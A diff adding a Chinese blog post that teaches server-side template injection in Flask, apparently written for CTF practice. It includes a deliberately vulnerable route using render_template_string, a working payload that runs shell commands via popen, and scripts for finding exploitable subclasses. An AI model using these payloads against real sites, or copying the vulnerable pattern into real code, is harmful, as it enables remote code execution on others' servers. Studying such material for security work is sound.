@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>SSTI_OF_FLASK - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="SSTI_OF_FLASK" />
+<meta property="og:description" content="前言 之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点 Flask" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/ssti/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-19T02:09:13+08:00" />
+<meta property="article:modified_time" content="2022-09-19T02:09:13+08:00" /><meta property="og:site_name" content="Huamang&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="SSTI_OF_FLASK"/>
+<meta name="twitter:description" content="前言 之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点 Flask"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/ssti/" /><link rel="prev" href="https://example.com/qwb2022/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SSTI_OF_FLASK",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/ssti\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  2889 ,
+        "url": "https:\/\/example.com\/ssti\/","datePublished": "2022-09-19T02:09:13+08:00","dateModified": "2022-09-19T02:09:13+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/example.com\/images\/avatar.png",
+                    "width":  320 ,
+                    "height":  320 
+                }},"author": {
+                "@type": "Person",
+                "name": "Huamang"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/ssti/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/ssti/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SSTI_OF_FLASK</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Huamang</a>
+</span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>技术分享</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-09-19">2022-09-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2889 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 6 分钟&nbsp;<i class="far fa-eye fa-fw"></i>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+            </div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#flask">Flask</a></li>
+    <li><a href="#攻击原理">攻击原理</a></li>
+    <li><a href="#利用">利用</a>
+      <ul>
+        <li><a href="#找利用链">找利用链</a></li>
+        <li><a href="#rce">RCE</a>
+          <ul>
+            <li><a href="#eval">eval</a></li>
+            <li><a href="#os模块">os模块</a></li>
+            <li><a href="#subprocesspopen类">subprocess.popen类</a></li>
+            <li><a href="#linecache-函数">linecache 函数</a></li>
+            <li><a href="#lipsum">lipsum</a></li>
+          </ul>
+        </li>
+        <li><a href="#文件读取">文件读取</a></li>
+      </ul>
+    </li>
+    <li><a href="#bypass">Bypass</a>
+      <ul>
+        <li><a href="#heading">{{</a></li>
+        <li><a href="#heading-1">[]</a>
+          <ul>
+            <li><a href="#getitem">getitem</a></li>
+            <li><a href="#pop">pop</a></li>
+            <li><a href="#字典">字典</a></li>
+          </ul>
+        </li>
+        <li><a href="#_">_</a></li>
+        <li><a href="#引号">引号'</a>
+          <ul>
+            <li><a href="#利用chr绕过">利用chr()绕过</a></li>
+            <li><a href="#利用request对象绕过">利用request对象绕过</a></li>
+          </ul>
+        </li>
+        <li><a href="#点">点.</a>
+          <ul>
+            <li><a href="#利用-attr-绕过适用于flask">利用 <code>|attr()</code> 绕过（适用于flask）</a></li>
+            <li><a href="#利用中括号-绕过">利用中括号[ ]绕过</a></li>
+          </ul>
+        </li>
+        <li><a href="#组合绕过">组合绕过</a>
+          <ul>
+            <li><a href="#--">. + []</a></li>
+            <li><a href="#__-">__ +.+[]</a></li>
+            <li><a href="#heading-2">&lsquo;+&quot;</a></li>
+            <li><a href="#_-1">_+'+&quot;</a></li>
+            <li><a href="#_--">_ +. +&rsquo;</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="前言">前言</h1>
+<p>之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点</p>
+<h1 id="flask">Flask</h1>
+<p>首先，是python是SSTI，那么就离不开flask，这里用一个简单的flask demo来介绍一下他的模板渲染</p>
+<p>构造如下的代码，以及目录结构</p>
+<p>目录结构</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">├── app.py  
+└── templates  
+    └── index.html
+</code></pre></td></tr></table>
+</div>
+</div><p>app.py内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template_string</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/index&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+   <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span><span class="n">user</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>index.html的内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>SSTI<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+ <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hello, {{user.name}}!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到这里是已经可以进行模板的渲染了，但是我们的<code>{{7*7}}</code>没有被渲染，这是因为这是正确的写法，并不存在SSTI漏洞</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220723210736546.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723210736546.png, https://tuchuang.huamang.xyz/img/image-20220723210736546.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723210736546.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220723210736546.png"
+        title="image-20220723210736546" /></p>
+<p>而什么情况才会存在SSTI的漏洞呢，很多很多的安全漏洞都源于程序员偷懒的不规范代码，这里也是，假如有个很小的功能点但是开发者不愿意创建一个html文件，选择直接用字符串插入html的话，那么漏洞可能就来了,比如下面这个demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">@app.route(&#39;/test&#39;)
+def test():
+    template = &#34;&#34;&#34;
+        &lt;div class=&#34;center-content&#34;&gt;
+        &lt;p&gt;Hello, %s&lt;/p&gt;
+    &lt;/div&gt;
+    &#34;&#34;&#34; % (request.args.get(&#39;name&#39;))
+    return render_template_string(template)
+
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到，这里是成功解析了的</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220723212821812.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723212821812.png, https://tuchuang.huamang.xyz/img/image-20220723212821812.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723212821812.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220723212821812.png"
+        title="image-20220723212821812" /></p>
+<h1 id="攻击原理">攻击原理</h1>
+<p>那么知道了漏洞存在了以后，我们改怎么利用，我们把最终的目标放在RCE，那么我们怎么才能在双大括号里面RCE，这就得从python语言来说起了，这里先给出几个核心的方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">__class__ 取类
+__bases__[0] 拿基类
+__base__ 拿基类
+__mro__ 返回一个类的调用顺序，__mro__[1]或者__mro__[-1]拿到基类
+__subclasses__() 返回子类集合
+__init__  类的初始化方法，所有自带带类都包含init方法，便于利用他当跳板来调用globals
+__globals__  function.__globals__，用于获取function所处空间下可使用的module、方法以及所有变量
+__builtins__  是一个包含了大量内置函数的一个模块
+</code></pre></td></tr></table>
+</div>
+</div><p>python中所有的类的基类，都是object，我们可以这样获取类</p>
+<p><strong>xx.__class__</strong>，例如字符串，元组，列表</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220723224813292.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723224813292.png, https://tuchuang.huamang.xyz/img/image-20220723224813292.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723224813292.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220723224813292.png"
+        title="image-20220723224813292" /></p>
+<p>在python中每个类都有一个<strong>bases</strong>属性，这个的意思就是<strong>基类</strong>，也就是之前提到的object</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220723231849079.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723231849079.png, https://tuchuang.huamang.xyz/img/image-20220723231849079.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723231849079.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220723231849079.png"
+        title="image-20220723231849079" /></p>
+<p>拿到基层的object，我们就可以往其他的方向去发展了，这里就用到了一个<strong>subclasses</strong>() 方法，他的作用是：返回的是这个类的子类的集合，也就是object类的子类的集合</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220723234404088.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723234404088.png, https://tuchuang.huamang.xyz/img/image-20220723234404088.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723234404088.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220723234404088.png"
+        title="image-20220723234404088" /></p>
+<p>那么就可以供我们挑选了，我们找到可以利用的类，选中来利用，例如这里的&lt;class &lsquo;os._wrap_close&rsquo;&gt;</p>
+<p>不同版本的python可能会在不用的位置，我的环境里是<code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[133]</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220723235402485.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235402485.png, https://tuchuang.huamang.xyz/img/image-20220723235402485.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235402485.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220723235402485.png"
+        title="image-20220723235402485" /></p>
+<p>这里就到了下一个点，<code>.init.globals</code>，这个init用来初始化类，globals用来全局查找所有方法和变量及参数</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220723235527394.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235527394.png, https://tuchuang.huamang.xyz/img/image-20220723235527394.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235527394.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220723235527394.png"
+        title="image-20220723235527394" /></p>
+<p>可以发现，这里是有popen的，这个就可以命令执行了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220723235628539.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235628539.png, https://tuchuang.huamang.xyz/img/image-20220723235628539.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235628539.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220723235628539.png"
+        title="image-20220723235628539" /></p>
+<p>这样就可以rce了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220723235742273.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235742273.png, https://tuchuang.huamang.xyz/img/image-20220723235742273.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235742273.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220723235742273.png"
+        title="image-20220723235742273" /></p>
+<p>当然这只是其中一个方法，在获取到了object后，能走的路非常多，获取object的方法也很多</p>
+<p>比如<code>__mro__</code>，这个就可以用来获取基类，他会返回一个类的调用顺序，其中就必定会有object</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220724001442014.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220724001442014.png, https://tuchuang.huamang.xyz/img/image-20220724001442014.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220724001442014.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220724001442014.png"
+        title="image-20220724001442014" /></p>
+<h1 id="利用">利用</h1>
+<h2 id="找利用链">找利用链</h2>
+<p>这里我们可以用脚本来跑出我们想要的东西</p>
+<p>本地</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">search</span> <span class="o">=</span> <span class="s1">&#39;popen&#39;</span>
+<span class="n">num</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">():</span>
+    <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">search</span> <span class="ow">in</span> <span class="n">i</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">count</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">():</span>
+	<span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+	<span class="k">if</span> <span class="s2">&#34;warpper&#34;</span> <span class="ow">in</span> <span class="nb">repr</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="fm">__init__</span><span class="p">):</span>
+		<span class="k">pass</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="k">if</span> <span class="s2">&#34;os&#34;</span> <span class="ow">in</span> <span class="nb">repr</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">):</span>
+				<span class="nb">print</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+		<span class="k">except</span><span class="p">:</span>
+			<span class="k">pass</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>远程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">a</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span><span class="s2">&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;
+</span><span class="s2">&#34;&#34;&#34;</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">allList</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="s2">&#34;&gt;&#34;</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="n">i</span>
+        <span class="n">allList</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+    <span class="k">elif</span> <span class="n">i</span> <span class="o">==</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="ow">or</span> <span class="n">i</span> <span class="o">==</span> <span class="s2">&#34;,&#34;</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="n">i</span>
+        
+<span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">allList</span><span class="p">):</span>
+    <span class="k">if</span> <span class="s2">&#34;os._wrap_close&#34;</span> <span class="ow">in</span> <span class="n">v</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">k</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;---&gt;&#34;</span><span class="o">+</span><span class="n">v</span><span class="p">)</span>
+</code></pre></td></tr></table>
